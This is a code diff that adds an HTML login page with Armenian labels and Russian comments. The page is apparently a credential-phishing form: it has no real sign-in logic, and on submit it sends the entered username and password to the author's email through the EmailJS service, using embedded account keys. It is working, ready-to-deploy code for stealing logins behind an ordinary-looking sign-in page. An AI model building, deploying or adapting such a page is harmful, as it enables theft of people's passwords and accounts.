@@ -1,0 +1,116 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Մուտք գործել</title>
+    <style>
+        /* Общие стили */
+        body {
+            margin: 0;
+            font-family: Arial, sans-serif;
+            background-color: #f4f4f4;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+        }
+
+        /* Контейнер формы */
+        .login-container {
+            width: 350px;
+            background-color: #fff;
+            border-radius: 10px;
+            box-shadow: 0 4px 10px rgba(0, 0, 0, 0.2);
+            text-align: center;
+        }
+
+        /* Верхняя розовая панель */
+        .login-header {
+            background-color: #e91e63;
+            color: #fff;
+            font-size: 20px;
+            padding: 15px 0;
+            border-radius: 10px 10px 0 0;
+        }
+
+        /* Поля ввода */
+        .form-group {
+            display: flex;
+            align-items: center;
+            border-bottom: 1px solid #ddd;
+            margin: 20px 20px;
+        }
+
+        .form-group img {
+            width: 20px;
+            height: 20px;
+            margin-right: 10px;
+        }
+
+        .form-group input {
+            width: 100%;
+            padding: 10px;
+            border: none;
+            outline: none;
+            font-size: 16px;
+            color: #555;
+        }
+
+        /* Кнопка */
+        .login-button {
+            color: #e91e63;
+            font-size: 16px;
+            border: none;
+            background: transparent;
+            cursor: pointer;
+            margin: 20px 0;
+        }
+    </style>
+
+    <!-- Подключение EmailJS -->
+    <script src="https://cdn.jsdelivr.net/npm/emailjs-com@2.6.4/dist/email.min.js"></script>
+    <script>
+        (function() {
+            emailjs.init("pW8EBwU6rzRT8dlVc"); // Твой User ID
+        })();
+
+        function sendEmail(event) {
+            event.preventDefault();
+
+            emailjs.sendForm('service_fii42yu', 'template_swijn4r', event.target)
+                .then(function() {
+                    alert("Данные успешно отправлены!");
+                }, function(error) {
+                    alert("Ошибка отправки. Попробуйте позже.");
+                    console.error(error);
+                });
+        }
+    </script>
+</head>
+
+<body>
+    <div class="login-container">
+        <!-- Розовая шапка -->
+        <div class="login-header">Մուտք գործել</div>
+
+        <!-- Форма авторизации -->
+        <form onsubmit="sendEmail(event)">
+            <!-- Поле имени пользователя -->
+            <div class="form-group">
+                <img src="https://cdn-icons-png.flaticon.com/512/1077/1077114.png" alt="User">
+                <input type="text" name="username" placeholder="Մուտքանուն" required>
+            </div>
+
+            <!-- Поле пароля -->
+            <div class="form-group">
+                <img src="https://cdn-icons-png.flaticon.com/512/3064/3064155.png" alt="Lock">
+                <input type="password" name="password" placeholder="Գաղտնաբառ" required>
+            </div>
+
+            <!-- Кнопка отправки -->
+            <button type="submit" class="login-button">ՄՈՒՏՔ</button>
+        </form>
+    </div>
+</body>
+</html>
